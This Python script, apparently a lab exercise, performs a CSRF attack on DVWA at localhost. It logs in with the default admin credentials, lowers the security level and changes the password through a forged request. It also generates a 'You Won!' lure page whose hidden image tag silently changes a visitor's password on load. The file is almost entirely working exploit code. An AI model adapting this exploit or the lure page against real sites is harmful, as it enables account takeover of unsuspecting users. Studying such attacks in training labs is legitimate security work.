#!/usr/bin/env python3
"""
CSRF Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of CSRF vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import sys

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = ""

TARGET_URL = "http://localhost/vulnerabilities/csrf/"
LOGIN_URL = "http://localhost/login.php"
SECURITY_URL = "http://localhost/security.php"

def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    CSRF Exploitation Tool - DVWA
    Educational Purpose Only
{'='*70}{Style.RESET_ALL}
    """
    print(banner)

def get_authenticated_session():
    """Login to DVWA"""
    print(f"{Fore.YELLOW}[*] Logging into DVWA...{Style.RESET_ALL}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL)
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        session.post(LOGIN_URL, data=login_data)
        session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
        print(f"{Fore.GREEN}[+] Logged in successfully{Style.RESET_ALL}")
        return session
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return None

def change_password_csrf(session, new_password):
    """Exploit CSRF to change password"""
    print(f"\n{Fore.CYAN}[*] Attempting CSRF attack...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Target password: {new_password}{Style.RESET_ALL}")
    
    # Craft CSRF payload
    params = {
        'password_new': new_password,
        'password_conf': new_password,
        'Change': 'Change'
    }
    
    try:
        response = session.get(TARGET_URL, params=params)
        
        if 'Password Changed' in response.text:
            print(f"{Fore.GREEN}[+] CSRF attack successful!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Password changed to: {new_password}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] CSRF attack failed{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False

def generate_csrf_html(target_password):
    """Generate malicious HTML page"""
    html = f'''<!DOCTYPE html>
<html>
<head><title>You Won!</title></head>
<body>
    <h1>Congratulations! Click to claim your prize!</h1>
    <img src="http://localhost/vulnerabilities/csrf/?password_new={target_password}&password_conf={target_password}&Change=Change" style="display:none;">
</body>
</html>'''
    
    with open('csrf-generated.html', 'w') as f:
        f.write(html)
    
    print(f"{Fore.GREEN}[+] Generated: csrf-generated.html{Style.RESET_ALL}")

def main():
    print_banner()
    
    session = get_authenticated_session()
    if not session:
        sys.exit(1)
    
    # Test CSRF attack
    change_password_csrf(session, 'csrf_pwned')
    
    # Generate attack page
    generate_csrf_html('csrf_auto')
    
    print(f"\n{Fore.MAGENTA}{'='*70}")
    print(f"[!] CSRF attack demonstrated")
    print(f"[!] Educational purposes only")
    print(f"{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
